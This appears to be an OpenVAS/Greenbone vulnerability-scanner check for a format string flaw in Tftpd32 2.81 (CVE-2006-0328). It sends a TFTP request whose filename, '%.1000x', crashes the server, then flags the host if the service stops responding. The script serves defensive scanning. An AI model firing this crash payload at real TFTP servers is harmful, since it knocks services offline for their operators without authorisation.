if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902835" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_cve_id( "CVE-2006-0328" );
	script_bugtraq_id( 16333 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-05-23 14:14:14 +0530 (Wed, 23 May 2012)" );
	script_name( "TFTPD32 Request Error Message Format String Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/18539" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/632633" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/24250" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/1424" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/422405" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause a denial of service." );
	script_tag( name: "affected", value: "Tftpd32 version 2.81." );
	script_tag( name: "insight", value: "The flaw is due to a format string error when the filename received in
  a TFTP request is used to construct an error message. This can be exploited
  to crash the application via a TFTP request packet containing a specially crafted filename." );
	script_tag( name: "solution", value: "Upgrade to Tftpd32 version 2.8.2 or later." );
	script_tag( name: "summary", value: "This host is running TFTPD32 and is prone to format string
  vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("tftp.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_alive( port: port )){
	exit( 0 );
}
tftp_get( path: "%.1000x", port: port );
if(!tftp_alive( port: port )){
	security_message( port: port, proto: "udp" );
	exit( 0 );
}
exit( 99 );

